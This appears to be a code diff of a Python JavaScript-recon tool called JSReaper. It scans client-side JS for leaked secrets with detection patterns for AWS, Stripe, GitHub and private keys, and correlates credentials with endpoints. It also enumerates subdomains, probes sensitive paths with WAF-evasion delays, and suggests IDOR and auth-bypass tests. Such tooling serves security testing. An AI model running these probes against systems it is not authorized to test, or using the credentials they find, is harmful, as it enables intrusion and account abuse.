-                        "source_domain":    results["source_domain"],
-                        "source_file":      url,
-                        "confidence":       conf["confidence"],
-                        "confidence_score": conf["confidence_score"],
-                        "fp_reason":        conf["fp_reason"],
-                    })
-                    score_map = {"critical":100,"high":50,"medium":20,"low":5,"info":1}
-                    results["score"] += score_map.get(effective_severity, 1)
-            except re.error:
-                continue
-
-    # ── false negative reduction pass ───────────────────────────────────
-    # run broader patterns to catch things the main pass might have missed
-    fn_findings = run_false_negative_pass(
-        content, lines, seen_findings,
-        source_domain=results["source_domain"],
-        source_url=url
-    )
-    results["findings"].extend(fn_findings)
-    score_map = {"critical":100,"high":50,"medium":20,"low":5,"info":1}
-    for f in fn_findings:
-        results["score"] += score_map.get(f["severity"], 1)
-
-    # endpoints
-    for pat in [
-        r'["\'](\/?(?:api|v[0-9]+|rest|graphql|endpoint|service)[\/a-zA-Z0-9_\-\.?=&%#@!]+)["\']',
-        r'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"\'<>]*)?',
-    ]:
-        for match in re.finditer(pat, content, re.IGNORECASE):
-            ep = match.group(1) if match.lastindex else match.group(0)
-            if ep not in results["endpoints"] and len(ep) > 3:
-                results["endpoints"].append(ep)
-
-    # JS relationships
-    for pat in [
-        r'(?:import|require)\s*[\(\s]*["\']([^"\']+\.js)["\']',
-        r'src\s*[:=]\s*["\']([^"\']+\.js)["\']',
-    ]:
-        for match in re.finditer(pat, content, re.IGNORECASE):
-            rel = match.group(1)
-            if rel not in results["js_relations"]:
-                results["js_relations"].append(rel)
-
-
-    # ── parameter extraction ────────────────────────────────────────────
-    results["parameters"] = extract_parameters_and_endpoints(content, url)
-
-    # tech fingerprint
-    results["technologies"] = fingerprint_technologies(content, url)
-    results["tech_risks"]   = check_tech_risks(results["technologies"])
-
-    # ── intelligence engine ──────────────────────────────────────────────
-    # skip deep intelligence on library files — too much noise
-    if not is_lib:
-        # precision secret scan (SecretFinder/TruffleHog style patterns)
-        results["precision_secrets"] = run_precision_secret_scan(
-            content, url, results["source_domain"]
-        )
-        # URL constructor detection — finds how the app builds API URLs
-        results["url_constructors"] = detect_url_constructors(
-            content, url, results["source_domain"]
-        )
-        # vulnerability indicator patterns
-        results["vuln_indicators"] = detect_vuln_indicators(
-            content, url, results["source_domain"]
-        )
-        # source map detection
-        sm_matches = re.findall(
-            r'//[#@]\s*sourceMappingURL=(\S+\.map)', content
-        )
-        results["source_maps"] = [
-            urljoin(url, sm) for sm in sm_matches if sm and not sm.startswith("data:")
-        ]
-        # boost score for precision secrets
-        score_map = {"critical": 100, "high": 50, "medium": 20}
-        for s in results["precision_secrets"]:
-            results["score"] += score_map.get(s["severity"], 10)
-
-    return results
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  CROSS-FILE CORRELATION ENGINE
-#  When we have results from multiple JS files, look for patterns that
-#  only make sense when you connect the dots across files.
-#  e.g. an endpoint found in one file + a key found in another =
-#  a much stronger finding than either alone.
-# ═════════════════════════════════════════════════════════════════════════════
-
-def correlate_findings(all_analysis):
-    """
-    Analyze findings across ALL JS files together.
-    Looks for:
-      - Same secret appearing in multiple files (confirms it's real)
-      - Endpoints in one file that match sensitive path patterns in another
-      - Key + endpoint combinations that suggest exploitable chains
-      - Domain appearing in multiple files (cross-origin references)
-
-    Returns a list of correlation findings.
-    """
-    correlations = []
-
-    # collect all findings by type across all files
-    keys_found     = []  # API keys, tokens, passwords
-    endpoints      = []  # API endpoints
-    internal_ips   = []  # internal IP references
-    db_strings     = []  # database connection info
-
-    for res in all_analysis:
-        domain = res.get("source_domain", get_domain(res["url"]))
-        for f in res["findings"]:
-            sev = f["severity"]
-            cat = f["category"]
-            if cat in ["API Keys & Tokens", "AWS Credentials",
-                       "Authentication & Passwords", "Cloud & Infrastructure"]:
-                keys_found.append({**f, "domain": domain, "file": res["url"]})
-            if cat == "Sensitive Endpoints & Paths":
-                endpoints.append({**f, "domain": domain, "file": res["url"]})
-            if cat == "Internal Infrastructure":
-                internal_ips.append({**f, "domain": domain, "file": res["url"]})
-            if cat == "Database Credentials":
-                db_strings.append({**f, "domain": domain, "file": res["url"]})
-
-        for ep in res.get("endpoints", []):
-            endpoints.append({"match": ep, "domain": domain, "file": res["url"], "severity": "info"})
-
-    # ── correlation 1: key + endpoint in the same domain ─────────────────
-    # a secret + an API endpoint from the same domain is a strong combo
-    key_domains = {k["domain"] for k in keys_found}
-    ep_domains  = {e["domain"] for e in endpoints if e.get("severity") != "info"}
-    shared      = key_domains & ep_domains
-    for domain in shared:
-        domain_keys = [k for k in keys_found if k["domain"] == domain]
-        domain_eps  = [e for e in endpoints if e["domain"] == domain and e.get("severity") != "info"]
-        if domain_keys and domain_eps:
-            correlations.append({
-                "type":        "KEY + ENDPOINT CHAIN",
-                "severity":    "critical",
-                "domain":      domain,
-                "description": (f"Found {len(domain_keys)} credential(s) AND "
-                                f"{len(domain_eps)} sensitive endpoint(s) on the same domain. "
-                                f"The credentials may provide access to those endpoints."),
-                "files":       list({k["file"] for k in domain_keys} | {e["file"] for e in domain_eps}),
-                "keys":        [k["match"][:60] for k in domain_keys[:3]],
-                "endpoints":   [e["match"][:60] for e in domain_eps[:3]],
-            })
-
-    # ── correlation 2: same secret in multiple files ──────────────────────
-    # if the same token appears in 2+ JS files it's almost certainly real
-    match_counts = defaultdict(list)
-    for k in keys_found:
-        match_counts[k["match"][:40]].append(k["file"])
-    for match_text, files in match_counts.items():
-        if len(set(files)) >= 2:
-            correlations.append({
-                "type":        "SECRET IN MULTIPLE FILES",
-                "severity":    "high",
-                "domain":      get_domain(files[0]),
-                "description": (f"The same secret/token appears in {len(set(files))} different JS files. "
-                                f"This strongly suggests it is a real credential, not a placeholder."),
-                "files":       list(set(files)),
-                "keys":        [match_text],
-                "endpoints":   [],
-            })
-
-    # ── correlation 3: internal IP + key in same domain ───────────────────
-    ip_domains = {i["domain"] for i in internal_ips}
-    for domain in key_domains & ip_domains:
-        correlations.append({
-            "type":        "CREDENTIAL + INTERNAL NETWORK",
-            "severity":    "high",
-            "domain":      domain,
-            "description": (f"Internal IP address(es) AND credential(s) found on the same domain. "
-                            f"The credentials may provide access to internal infrastructure."),
-            "files":       list({k["file"] for k in keys_found if k["domain"]==domain} |
-                                {i["file"] for i in internal_ips if i["domain"]==domain}),
-            "keys":        [],
-            "endpoints":   [],
-        })
-
-    # ── correlation 4: database credentials found anywhere ────────────────
-    for db in db_strings:
-        correlations.append({
-            "type":        "DATABASE ACCESS",
-            "severity":    "critical",
-            "domain":      db["domain"],
-            "description": (f"Database connection string found in JS file. "
-                            f"This may provide direct database access."),
-            "files":       [db["file"]],
-            "keys":        [db["match"][:80]],
-            "endpoints":   [],
-        })
-
-    return correlations
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PRINT ANALYSIS RESULTS  (per-file, domain-attributed)
-# ═════════════════════════════════════════════════════════════════════════════
-
-def print_analysis(results, show_endpoints=True):
-    url     = results["url"]
-    domain  = results.get("source_domain", get_domain(url))
-    findings = sorted(results["findings"], key=lambda x: SEVERITY_ORDER.get(x["severity"],99))
-    score    = results["score"]
-
-    score_color = (FG_CRITICAL if score>=200 else FG_HIGH if score>=80 else
-                   FG_MEDIUM   if score>=20  else FG_LOW)
-    count_color = (FG_CRITICAL if len(findings)>=10 else FG_HIGH if len(findings)>=5 else
-                   FG_MEDIUM   if len(findings)>=1  else FG_SUCCESS)
-
-    w = term_width()
-    print(f"\n{FG_DIM}{'─'*w}{RESET}")
-    # always show which domain this file belongs to
-    print(f"  {FG_DIM}Domain :{RESET} {FG_SUB}{domain}{RESET}")
-    print(f"  {FG_URL}File   : {url[:w-12]}{RESET}")
-    print(f"  {FG_DIM}Size   :{RESET} {results['size']:,} bytes  "
-          f"{FG_DIM}Findings:{RESET} {count_color}{len(findings)}{RESET}  "
-          f"{FG_DIM}Score:{RESET} {score_color}{score}{RESET}")
-    print(f"{FG_DIM}{'─'*w}{RESET}")
-
-    # library file notice — tell users why findings may be limited
-    if results.get("library_file"):
-        print(f"  {FG_DIM}⊘ Library file — only critical findings shown ({results.get('library_reason','')}){RESET}")
-
-    # tech stack
-    if results.get("technologies"):
-        techs = list(results["technologies"].keys())
-        print(f"  {FG_TECH}Tech Stack: {', '.join(techs)}{RESET}")
-        for risk in results.get("tech_risks", []):
-            print(f"  {FG_MEDIUM}  ⚠ {risk['tech']} v{risk['version']} — {risk['note']}{RESET}")
-
-    # per-file reasoning verdict
-    if not results.get("library_file"):
-        file_reasoning = reason_about_file(results)
-        verdict = file_reasoning["verdict"]
-        vcolor  = FG_CRITICAL if "CRITICAL" in verdict else FG_HIGH if "HIGH" in verdict else FG_MEDIUM if "MEDIUM" in verdict else FG_SUCCESS
-        print(f"  {FG_DIM}Verdict:{RESET} {vcolor}{verdict}{RESET}")
-
-    if not findings and not results["endpoints"]:
-        print(f"  {FG_SUCCESS}✓ Nothing significant found — moving on.{RESET}")
+def print_findings(findings, file_url, domain):
+    """Print all findings for one JS file, sorted by severity."""
+    if not findings:
         return
 
-    by_cat = defaultdict(list)
-    for f in findings:
-        by_cat[f["category"]].append(f)
+    w = W()
+    fname = file_url.split("/")[-1]
 
-    for cat, cat_findings in by_cat.items():
-        cat_color = CATEGORY_COLORS.get(cat, FG_LABEL)
-        print(f"\n  {cat_color}▸ {cat}  ({len(cat_findings)}){RESET}")
-        for f in cat_findings:
-            sev     = f["severity"]
-            badge   = SEVERITY_BADGE.get(sev, "")
-            fg      = SEVERITY_FG.get(sev, "")
-            icon    = SEVERITY_ICONS.get(sev, "")
-            sev_tag = f" {sev.upper():<8} "
+    sorted_f = sorted(findings, key=lambda x: SEV_ORDER.get(x["severity"],9))
 
-            # confidence label — shown next to each finding so users know how much to trust it
-            conf       = f.get("confidence", "")
-            conf_score = f.get("confidence_score", 0)
-            if conf == "confirmed":
-                conf_label = f"{FG_SUCCESS}[✓ CONFIRMED]{RESET}"
-            elif conf == "likely":
-                conf_label = f"{FG_MEDIUM}[~ LIKELY]{RESET}"
-            elif conf == "possible":
-                conf_label = f"{FG_DIM}[? POSSIBLE]{RESET}"
-            else:
-                conf_label = ""
+    for f in sorted_f:
+        sev    = f["severity"]
+        badge  = SEV_BADGE.get(sev,"")
+        color  = SEV_COLOR.get(sev, WHITE)
+        sev_l  = f" {sev.upper():<8} "
 
-            print(f"    {badge}{sev_tag}{RESET} {icon} "
-                  f"{FG_DIM}L{f['line']:4d}{RESET}  "
-                  f"{fg}{f['match'][:w-50]}{RESET}  {conf_label}")
+        print(f"  {badge}{sev_l}{RESET}  "
+              f"{CYAN}{f['type']:<25}{RESET}  "
+              f"{DIM}L{f['line']:4d}  {fname[:20]}{RESET}")
+        print(f"    {color}{f['description']}{RESET}")
+        if f.get("match"):
+            print(f"    {DIM}match  : {f['match'][:w-14]}{RESET}")
+        if f.get("context") and f["context"].strip() != f.get("match","").strip():
+            print(f"    {DIM}context: {f['context'][:w-14]}{RESET}")
+        print()
 
-            # show context line
-            if f["context"] and f["context"].strip() != f["match"].strip():
-                ctx = f["context"][:w-16]
-                print(f"    {FG_DIM}{'':13}→ {ctx}{RESET}")
 
-            # if confidence was downgraded, explain why
-            if f.get("fp_reason") and conf in ["possible"]:
-                print(f"    {FG_DIM}{'':13}⚠ Note: {f['fp_reason'][:w-20]}{RESET}")
-
-            # show FN broad-pass description if it came from that pass
-            if f.get("fn_description"):
-                print(f"    {FG_DIM}{'':13}⟫ {f['fn_description']}{RESET}")
-
-    if show_endpoints and results["endpoints"]:
-        print(f"\n  {FG_SECTION}▸ Endpoints ({len(results['endpoints'])}){RESET}")
-        for ep in results["endpoints"][:30]:
-            print(f"    {FG_URL}  ↳ {ep[:w-10]}{RESET}")
-        if len(results["endpoints"]) > 30:
-            info(f"  ... +{len(results['endpoints'])-30} more endpoints in output file")
-
-    if results["js_relations"]:
-        print(f"\n  {FG_RELATION}▸ JS Imports ({len(results['js_relations'])}){RESET}")
-        for rel in results["js_relations"][:10]:
-            print(f"    {FG_RELATION}  ↳ {rel[:w-10]}{RESET}")
-
-    # ── parameter findings ────────────────────────────────────────────────
-    params_data = results.get("parameters", {})
-    sensitive   = params_data.get("sensitive", [])
-    all_params  = params_data.get("all", [])
-
-    if sensitive:
-        print(f"\n  {FG_CRITICAL}▸ SENSITIVE PARAMETERS FOUND ({len(sensitive)}) — test these for injection/IDOR{RESET}")
-        for p in sensitive[:15]:
-            method   = p.get("method","GET")
-            endpoint = p.get("endpoint","?")[:50]
-            sparams  = ", ".join(p.get("sensitive_params",[]))
-            ptype    = p.get("type","")
-            print(f"    {SEVERITY_BADGE['high']} {method} {RESET}  {FG_URL}{endpoint}{RESET}")
-            print(f"    {FG_CRITICAL}         ⚠ Sensitive params: {sparams}{RESET}  {FG_DIM}[{ptype}]{RESET}")
-
-    elif all_params and len(all_params) > 0:
-        print(f"\n  {FG_SECTION}▸ Parameters & Endpoints ({len(all_params)}){RESET}")
-        for p in all_params[:10]:
-            method   = p.get("method","GET")
-            endpoint = p.get("endpoint","?")[:60]
-            params   = ", ".join(p.get("params",[])[:5])
-            ptype    = p.get("type","")
-            param_str = f"  [{params}]" if params else ""
-            print(f"    {FG_DIM}{method}{RESET}  {FG_URL}{endpoint}{RESET}{FG_DIM}{param_str}  [{ptype}]{RESET}")
-        if len(all_params) > 10:
-            print(f"    {FG_DIM}... and {len(all_params)-10} more in output file{RESET}")
-
-def print_correlations(correlations):
-    """print cross-file correlation findings"""
-    if not correlations:
+def print_endpoints_table(probed, domain):
+    """Print probed endpoints with their live HTTP status codes."""
+    if not probed:
         return
 
-    section_header("CROSS-FILE INTELLIGENCE REPORT", FG_CORR)
-    print(f"  {FG_CORR}JSReaper analyzed patterns ACROSS multiple JS files{RESET}")
-    print(f"  {FG_DIM}and found the following connected findings:{RESET}\n")
+    w = W()
+    hdr("LIVE ENDPOINT STATUS CHECK", CYAN)
+    print(f"  {DIM}{'STATUS':<8} {'MS':>5}  {'ENDPOINT':<45} {'PARAMS'}{RESET}")
+    print(f"  {DIM}{'─'*8} {'─'*5}  {'─'*45} {'─'*20}{RESET}")
+
+    # sort: 200 first, then 401/403, then others
+    order = lambda r: (0 if r["status"]==200 else 1 if r["status"] in [401,403] else 2 if r["status"]==500 else 3)
+    for r in sorted(probed, key=order):
+        status = r["status"]
+        sc     = STATUS_COLOR.get(status, DIM)
+        icon   = "●" if status==200 else "🔒" if status in [401,403] else "↩" if status in [301,302,307,308] else "💥" if status==500 else "✗"
+        ms_s   = f"{r['ms']}ms" if r['ms'] > 0 else "n/a"
+        ep     = r["endpoint"][:43]
+        params = ",".join(r["params"][:5]) if r["params"] else "-"
+
+        print(f"  {sc}{icon} {status if status>0 else 'err':<6}{RESET} "
+              f"{DIM}{ms_s:>5}{RESET}  "
+              f"{sc}{ep:<45}{RESET} "
+              f"{DIM}{params[:25]}{RESET}")
+
+        if r.get("redirect"):
+            print(f"  {DIM}         → {r['redirect'][:w-14]}{RESET}")
 
-    for i, c in enumerate(correlations, 1):
-        sev   = c["severity"]
-        badge = SEVERITY_BADGE.get(sev, "")
-        icon  = SEVERITY_ICONS.get(sev, "")
-        w     = term_width()
-
-        print(f"  {badge} {icon} FINDING #{i}: {c['type']} {RESET}")
-        print(f"  {FG_DIM}  Domain     :{RESET} {FG_SUB}{c['domain']}{RESET}")
-        print(f"  {FG_DIM}  Severity   :{RESET} {SEVERITY_FG[sev]}{sev.upper()}{RESET}")
-
-        # wrap description to terminal width
-        desc = c["description"]
-        words = desc.split()
-        line, lines = [], []
-        for word in words:
-            if sum(len(w)+1 for w in line) + len(word) > w - 20:
-                lines.append(" ".join(line))
-                line = [word]
-            else:
-                line.append(word)
-        if line:
-            lines.append(" ".join(line))
-        for l in lines:
-            print(f"  {FG_INFO}  {l}{RESET}")
-
-        if c.get("files"):
-            print(f"  {FG_DIM}  Found in   :{RESET}")
-            for f in c["files"][:4]:
-                print(f"  {FG_URL}    ↳ {f[:w-10]}{RESET}")
-
-        if c.get("keys"):
-            print(f"  {FG_DIM}  Credential :{RESET}")
-            for k in c["keys"][:2]:
-                print(f"  {FG_CRITICAL}    → {k}{RESET}")
-
-        if c.get("endpoints"):
-            print(f"  {FG_DIM}  Endpoints  :{RESET}")
-            for e in c["endpoints"][:2]:
-                print(f"  {FG_SECTION}    → {e}{RESET}")
-
-        print()
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  SUBDOMAIN RECON
-# ═════════════════════════════════════════════════════════════════════════════
-
-def run_subdomain_recon(domain):
-    section_header(f"SUBDOMAIN RECON: {domain}", FG_SECTION)
-    subdomains = set()
-    session    = build_session()
-
-    sources = [
-        ("crt.sh",       f"https://crt.sh/?q=%.{domain}&output=json"),
-        ("HackerTarget", f"https://api.hackertarget.com/hostsearch/?q={domain}"),
-        ("AlienVault",   f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"),
-    ]
-
-    for name, url in sources:
-        info(f"Querying {name}...")
-        try:
-            resp = session.get(url, timeout=20)
-            if resp.status_code != 200:
-                warn(f"{name} returned {resp.status_code}")
-                continue
-            if name == "crt.sh":
-                for entry in resp.json():
-                    for sub in entry.get("name_value","").split("\n"):
-                        sub = sub.strip().lstrip("*.")
-                        if sub.endswith(domain) and sub != domain:
-                            subdomains.add(sub)
-            elif name == "HackerTarget":
-                if "error" not in resp.text.lower():
-                    for line in resp.text.strip().split("\n"):
-                        if "," in line:
-                            sub = line.split(",")[0].strip()
-                            if sub.endswith(domain):
-                                subdomains.add(sub)
-            elif name == "AlienVault":
-                for entry in resp.json().get("passive_dns", []):
-                    hn = entry.get("hostname","")
-                    if hn.endswith(domain):
-                        subdomains.add(hn)
-            success(f"{name}: total {len(subdomains)} subdomains")
-        except Exception as e:
-            warn(f"{name} failed: {e}")
-
-    if subdomains:
-        print(f"\n{FG_SUCCESS}  Found {len(subdomains)} subdomains:{RESET}")
-        for sub in sorted(subdomains):
-            print(f"    {FG_SUB}  ⟫ https://{sub}{RESET}")
-    else:
-        warn("No subdomains found.")
-    return subdomains
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  SENSITIVE FILE PROBE
-# ═════════════════════════════════════════════════════════════════════════════
-
-def probe_sensitive_files(base_url, session, threads=5, waf_aware=False):
-    section_header(f"SENSITIVE FILE PROBE: {base_url}", FG_PROBE)
-    found  = []
-    domain = get_domain(base_url)
-
-    def check_path(path):
-        url  = base_url.rstrip("/") + path
-        if waf_aware:
-            random_delay(waf_mode=True)
-        resp = fetch_url(url, session, timeout=8)
-        if resp and resp.status_code in [200,301,302,403]:
-            return (url, resp.status_code, len(resp.content), domain)
-        return None
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(check_path, path): path for path in COMMON_SENSITIVE_PATHS}
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                url, status, size, dom = result
-                color = STATUS_COLORS.get(status, FG_DIM)
-                icon  = "🔥" if status==200 else "↩" if status in [301,302] else "🔒"
-                sev   = "high" if status==200 else "medium"
-                badge = SEVERITY_BADGE.get(sev,"")
-                w     = term_width()
-                disp  = url[:w-30] + "..." if len(url) > w-30 else url
-                print(f"  {badge} {status} {RESET}  {icon}  {color}{disp}{RESET}  {FG_DIM}({size}b){RESET}")
-                found.append({"url":url,"status":status,"size":size,"severity":sev,"domain":dom})
-
-    if not found:
-        success("No sensitive files found.")
-    return found
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  CORE SCAN ENGINE
-# ═════════════════════════════════════════════════════════════════════════════
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  REASONING ENGINE
-#
-#  This is what makes JSReaper think like a human analyst rather than
-#  a dumb pattern scanner.
-#
-#  For each JS file it gives:
-#    - A clear VERDICT: is this file worth your time?
-#    - A REASONING: why it reached that verdict
-#    - NEXT STEPS: what to actually do based on what was found
-#    - EXECUTIVE SUMMARY: cross-file picture across the whole target
-#
-#  This is what DeepSeek did that other tools don't:
-#    - Recognise library files and say "nothing here, move on"
-#    - Recognise custom app files and say "this is where the bugs are"
-#    - Connect dots across files: "file A shows admin API, file B shows
-#      user ID in URL — together this is an IDOR vector"
-#    - Generate proactive recon steps not in the JS at all
-#      (check .git, .env, directory listing, source maps)
-# ═════════════════════════════════════════════════════════════════════════════
-
-# Known public libraries — if ALL files are from this list, tell the user
-# to move on rather than wasting time on safe third-party code
-KNOWN_SAFE_LIBRARIES = {
-    "jquery", "bootstrap", "aos", "swiper", "toastr", "lodash",
-    "moment", "axios", "react", "vue", "angular", "d3", "chart",
-    "leaflet", "three", "gsap", "slick", "select2", "datatables",
-    "fullcalendar", "highlight", "prism", "codemirror", "tinymce",
-    "ckeditor", "socket.io", "popper", "modernizr", "normalize",
-    "lazysizes", "svg-loader", "magnific-popup", "nice-select",
-    "lazysizes", "plugin", "polyfill", "core-js", "regenerator",
-    "babel", "webpack", "fontawesome", "materialize", "bulma",
-    "sweetalert", "animate", "waypoints", "isotope", "masonry",
-    "lightbox", "fancybox", "owl-carousel", "splide", "glide",
-}
-
-def classify_js_file(url, content, size):
-    """
-    Classify a JS file into one of four categories:
-      LIBRARY    — known third-party library, almost nothing to find
-      VENDOR     — bundled vendor chunk, skip most patterns
-      CUSTOM     — application-specific code, high value target
-      UNKNOWN    — can't tell, analyse fully
-    Returns (classification, reason, interest_score 0-10)
-    """
-    filename   = url.split("/")[-1].lower()
-    clean_name = re.sub(r"[-_~.](?:v?\d[\d.]*|min|bundle)", "", filename)
-    clean_name = re.sub(r"[-_~][a-f0-9]{6,}", "", clean_name)
-    clean_name = clean_name.replace(".js","").replace(".chunk","").strip("-_~.")
-
-    # check against known safe library names
-    for lib in KNOWN_SAFE_LIBRARIES:
-        if lib in clean_name or clean_name in lib:
-            return "LIBRARY", f"Known library: {lib}", 1
-
-    # vendor bundle indicators
-    if any(x in url.lower() for x in ["node_vendors", "node_modules", "/vendor/", "/vendors/"]):
-        return "VENDOR", "Webpack vendor bundle", 1
-
-    # webpack chunk with hash but not vendor
-    if re.search(r"[a-f0-9]{8,}\.chunk\.js", filename):
-        return "CUSTOM", "App-specific webpack chunk (contains custom code)", 8
-
-    # script.js, app.js, main.js, index.js = almost always custom
-    if re.match(r"^(script|app|main|index|application|custom|site)\.js$", clean_name):
-        return "CUSTOM", f"Custom application file ({filename})", 9
-
-    # large minified files are likely bundles
-    if size > 500_000:
-        return "VENDOR", f"Very large file ({size:,} bytes) — likely vendor bundle", 2
-
-    return "UNKNOWN", "Could not classify — analysing fully", 5
-
-
-def reason_about_file(res):
-    """
-    Generate a human-readable reasoning about a single JS file analysis.
-    Returns dict with verdict, reason, worth_reporting bool, next_steps list.
-    """
-    url      = res["url"]
-    filename = url.split("/")[-1]
-    findings = res.get("findings", [])
-    score    = res.get("score", 0)
-    is_lib   = res.get("library_file", False)
-    techs    = list(res.get("technologies", {}).keys())
-    prec     = res.get("precision_secrets", [])
-    constrs  = res.get("url_constructors", [])
-    vuln_ind = res.get("vuln_indicators", {})
-    src_maps = res.get("source_maps", [])
-    params   = res.get("parameters", {})
-
-    verdict      = "NOTHING TO REPORT"
-    worth        = False
-    reasons      = []
-    next_steps   = []
-    report_items = []
-
-    # ── library file ──────────────────────────────────────────────────────
-    if is_lib:
-        return {
-            "verdict":      "LIBRARY — SKIP",
-            "worth":        False,
-            "reasons":      [f"{filename} is a known third-party library. "
-                             "Public libraries contain no app-specific secrets or endpoints. "
-                             "Skip this file and move to custom application files."],
-            "next_steps":   [],
-            "report_items": [],
-        }
-
-    # ── precision secrets found ───────────────────────────────────────────
-    critical_secrets = [s for s in prec if s["severity"] == "critical"]
-    high_secrets     = [s for s in prec if s["severity"] == "high"]
-    if critical_secrets:
-        worth = True
-        verdict = "CRITICAL — REPORT IMMEDIATELY"
-        for s in critical_secrets:
-            reasons.append(f"CRITICAL SECRET: {s['service']} credential found at line {s['line']}")
-            report_items.append({
-                "title":    f"Exposed {s['service']} Credential in Client-Side JS",
-                "severity": "critical",
-                "steps":    f"1. Open {url}\n2. Search for: {s['match'][:40]}\n3. Verify credential is active",
-                "impact":   f"Attacker can use this {s['service']} credential to access/abuse the service"
-            })
-    elif high_secrets:
-        worth = True
-        verdict = "HIGH — WORTH INVESTIGATING"
-        for s in high_secrets:
-            reasons.append(f"Potential secret: {s['service']} at line {s['line']}")
-
-    # ── source maps ───────────────────────────────────────────────────────
-    if src_maps:
-        worth = True
-        verdict = verdict if worth else "MEDIUM — WORTH CHECKING"
-        for sm in src_maps:
-            reasons.append(f"Source map referenced: {sm.split('/')[-1]} — if accessible, exposes full unminified source code")
-            next_steps.append(f"GET {sm}")
-            next_steps.append(f"  → 200 response with JSON = source code exposed (reportable as Information Disclosure)")
-            report_items.append({
-                "title":    "Source Map Exposed — Full Source Code Disclosure",
-                "severity": "medium",
-                "steps":    f"1. Visit: {sm}\n2. If JSON response with 'sources' key = confirmed",
-                "impact":   "Full unminified source code exposed, revealing business logic, API keys, and internal architecture"
-            })
-
-    # ── URL constructors ──────────────────────────────────────────────────
-    if constrs:
-        worth = True
-        verdict = verdict if "CRITICAL" in verdict or "HIGH" in verdict else "MEDIUM — API SURFACE EXPOSED"
-        endpoints = [c["endpoint"] for c in constrs[:5]]
-        reasons.append(f"API URL constructor found — app builds endpoints dynamically. "
-                       f"Discovered patterns: {', '.join(endpoints[:3])}")
-        next_steps.append(f"# Test these discovered API endpoints for auth bypass and IDOR:")
-        for c in constrs[:8]:
-            ep = c["endpoint"]
-            next_steps.append(f"GET  https://{get_domain(url)}{ep}")
-            next_steps.append(f"GET  https://{get_domain(url)}{ep}/1")
-            next_steps.append(f"GET  https://{get_domain(url)}{ep}?id=1")
-
-    # ── vulnerability indicators ──────────────────────────────────────────
-    high_vulns = [v for v in vuln_ind if v in ("SQLi", "SSRF", "RCE", "PathTraversal")]
-    med_vulns  = [v for v in vuln_ind if v in ("IDOR", "XSS", "OpenRedirect", "MassAssignment")]
-
-    if high_vulns:
-        worth = True
-        verdict = verdict if "CRITICAL" in verdict else f"HIGH — {', '.join(high_vulns)} INDICATORS"
-        for v in high_vulns:
-            reasons.append(f"{v} indicator in code — user input flows into dangerous function. Needs manual verification.")
-            next_steps.append(f"# Manually review {filename} for {v} — look at line {vuln_ind[v][0]['line']}")
-            next_steps.append(f"  Code: {vuln_ind[v][0]['context'][:80]}")
-
-    if med_vulns and not high_vulns:
-        worth = True
-        verdict = verdict if worth else f"MEDIUM — {', '.join(med_vulns)} INDICATORS"
-        for v in med_vulns:
-            reasons.append(f"{v} code pattern found. May be exploitable depending on server-side handling.")
-
-    # ── sensitive parameters ──────────────────────────────────────────────
-    sensitive_params = params.get("sensitive", []) if params else []
-    if sensitive_params:
-        worth = True
-        for p in sensitive_params[:3]:
-            ep     = p.get("endpoint","")
-            sparams = p.get("sensitive_params",[])
-            reasons.append(f"Sensitive parameter(s) {sparams} found in endpoint {ep}")
-            next_steps.append(f"# Test for IDOR — {ep} with sensitive params: {sparams}")
-            next_steps.append(f"GET  https://{get_domain(url)}{ep}?{'&'.join(f'{p}=1' for p in sparams[:3])}")
-
-    # ── nothing found ─────────────────────────────────────────────────────
-    if not worth:
-        reasons.append(f"{filename} contains no credentials, sensitive endpoints, or vulnerability indicators. "
-                       "This is likely safe library or minified code with no app-specific logic.")
-        verdict = "NOTHING TO REPORT — SKIP"
-
-    return {
-        "verdict":      verdict,
-        "worth":        worth,
-        "reasons":      reasons,
-        "next_steps":   next_steps,
-        "report_items": report_items,
-    }
-
-
-def probe_endpoint_live(url, session, timeout=8):
-    """
-    Actually probe an endpoint and return the real HTTP status code.
-    This is what separates real intelligence from guessing.
-    Returns (status_code, content_length, redirect_url, response_time_ms)
-    """
-    import time as _time
-    start = _time.time()
-    try:
-        resp = session.get(url, timeout=timeout, allow_redirects=False, verify=False)
-        elapsed = int((_time.time() - start) * 1000)
-        redir = resp.headers.get("Location", "") if resp.status_code in [301,302,303,307,308] else ""
-        return resp.status_code, len(resp.content), redir, elapsed
-    except Exception:
-        return 0, 0, "", 0
-
-
-def severity_from_evidence(category, match_text, context, confidence):
-    """
-    Assign severity based on ACTUAL EVIDENCE — not just the word found.
-    The word 'admin' alone = INFO.
-    An admin endpoint returning 200 without auth = MEDIUM.
-    An AWS key matching AKIA format = CRITICAL.
-    A hardcoded password with high entropy = HIGH.
-    """
-    match_lower   = match_text.lower()
-    context_lower = context.lower()
-
-    # These patterns have unique formats — severity is always justified
-    if re.search(r'AKIA[0-9A-Z]{16}', match_text):               return "critical"
-    if re.search(r'sk_live_[A-Za-z0-9]{24,}', match_text):       return "critical"
-    if re.search(r'-----BEGIN.*PRIVATE KEY', match_text):         return "critical"
-    if re.search(r'github_pat_|ghp_|gho_', match_text):          return "critical"
-    if re.search(r'SG\.[A-Za-z0-9_\-]{40,}', match_text):        return "critical"
-    if re.search(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}', match_text): return "high"
-    if re.search(r'AIza[0-9A-Za-z\-_]{35}', match_text):         return "high"
-
-    # Endpoint words — INFO until verified reachable
-    endpoint_words = ['admin', 'debug', 'internal', 'config', 'backup',
-                      'swagger', 'graphql', 'api', 'v1', 'v2']
-    if any(w in match_lower for w in endpoint_words):
-        return "info"   # just a string — needs live probe to be more
-
-    # Sensitive variable names — depends on value quality
-    if confidence == "confirmed":
-        if category in ("AWS Credentials", "Authentication & Passwords", "Cloud & Infrastructure"):
-            return "high"
-        return "medium"
-    elif confidence == "likely":
-        return "low"
-
-    return "info"
-
-
-def generate_executive_summary(domain, all_analysis, base_url, session):
-    """
-    Intelligence report that works on the ACTUAL target data only.
-    No guessing, no generic templates, no preachy "nothing here" messages.
-
-    What it does:
-    1. Collects ALL unique endpoints extracted from THIS target's JS files
